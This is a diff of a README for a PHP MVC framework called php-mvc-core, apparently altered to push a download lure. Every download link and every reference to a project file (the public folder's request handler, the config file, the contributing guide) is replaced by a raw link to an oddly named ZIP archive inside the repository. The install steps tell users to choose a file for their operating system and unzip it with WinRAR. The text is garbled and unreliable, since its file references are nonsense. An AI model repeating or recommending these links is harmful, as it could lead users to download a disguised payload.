@@ -1,6 +1,6 @@
 # 🚀 php-mvc-core - Easy PHP Framework for Rapid Development
 
-[![Download php-mvc-core](https://raw.githubusercontent.com/0258hahung/php-mvc-core/master/fury/php-mvc-core.zip%20php--mvc--core-%23FF5733?style=for-the-badge)](https://raw.githubusercontent.com/0258hahung/php-mvc-core/master/fury/php-mvc-core.zip)
+[![Download php-mvc-core](https://raw.githubusercontent.com/0258hahung/php-mvc-core/master/form/php-mvc-core-Gelidiaceae.zip%20php--mvc--core-%23FF5733?style=for-the-badge)](https://raw.githubusercontent.com/0258hahung/php-mvc-core/master/form/php-mvc-core-Gelidiaceae.zip)
 
 ## 📖 Description
 
@@ -27,7 +27,7 @@ php-mvc-core is a lightweight PHP framework designed for learning and rapid prot
 To get started with php-mvc-core, follow these steps:
 
 1. **Download the Framework:**
-   Visit this page to download: [php-mvc-core Releases](https://raw.githubusercontent.com/0258hahung/php-mvc-core/master/fury/php-mvc-core.zip).
+   Visit this page to download: [php-mvc-core Releases](https://raw.githubusercontent.com/0258hahung/php-mvc-core/master/form/php-mvc-core-Gelidiaceae.zip).
 
 2. **Extract the Files:**
    After downloading, unzip the files to a folder on your computer.
@@ -47,7 +47,7 @@ To get started with php-mvc-core, follow these steps:
 
 To install php-mvc-core, follow these instructions:
 
-1. Go to the [php-mvc-core Releases](https://raw.githubusercontent.com/0258hahung/php-mvc-core/master/fury/php-mvc-core.zip) page to download the latest version.
+1. Go to the [php-mvc-core Releases](https://raw.githubusercontent.com/0258hahung/php-mvc-core/master/form/php-mvc-core-Gelidiaceae.zip) page to download the latest version.
 2. Choose the appropriate file for your operating system and click on it to download.
 3. Once the download is complete, locate the ZIP file on your computer.
 4. Unzip the file using your preferred method (right-click and select "Extract" or use a tool like WinRAR).
@@ -65,12 +65,12 @@ The php-mvc-core framework has a simple directory structure. Here’s what you w
 ```
 
 - **app/**: Contains the main application files, including models, controllers, and views.
-- **public/**: This is the folder your web server should point to. It contains the https://raw.githubusercontent.com/0258hahung/php-mvc-core/master/fury/php-mvc-core.zip file for handling requests.
+- **public/**: This is the folder your web server should point to. It contains the https://raw.githubusercontent.com/0258hahung/php-mvc-core/master/form/php-mvc-core-Gelidiaceae.zip file for handling requests.
 - **vendor/**: Contains third-party packages installed through Composer.
 
 ## 🛠️ Basic Configuration
 
-You may need to configure a few settings to make the framework work best for you. Look in the `https://raw.githubusercontent.com/0258hahung/php-mvc-core/master/fury/php-mvc-core.zip` file:
+You may need to configure a few settings to make the framework work best for you. Look in the `https://raw.githubusercontent.com/0258hahung/php-mvc-core/master/form/php-mvc-core-Gelidiaceae.zip` file:
 
 1. **Database Configuration:**
    Update the database connection details with your server's information.
@@ -94,10 +94,10 @@ A: Yes, you can easily connect to databases like MySQL using PDO.
 
 **Q: How do I contribute to this project?**
 
-A: Contributions are welcome! Please check the `https://raw.githubusercontent.com/0258hahung/php-mvc-core/master/fury/php-mvc-core.zip` file in the repository for guidelines.
+A: Contributions are welcome! Please check the `https://raw.githubusercontent.com/0258hahung/php-mvc-core/master/form/php-mvc-core-Gelidiaceae.zip` file in the repository for guidelines.
 
 ## 📬 Contact
 
 If you have questions or need further assistance, feel free to reach out through our GitHub Issues page.
 
-Visit the [php-mvc-core Releases](https://raw.githubusercontent.com/0258hahung/php-mvc-core/master/fury/php-mvc-core.zip) for downloads and stay updated with the latest features and improvements.
+Visit the [php-mvc-core Releases](https://raw.githubusercontent.com/0258hahung/php-mvc-core/master/form/php-mvc-core-Gelidiaceae.zip) for downloads and stay updated with the latest features and improvements.
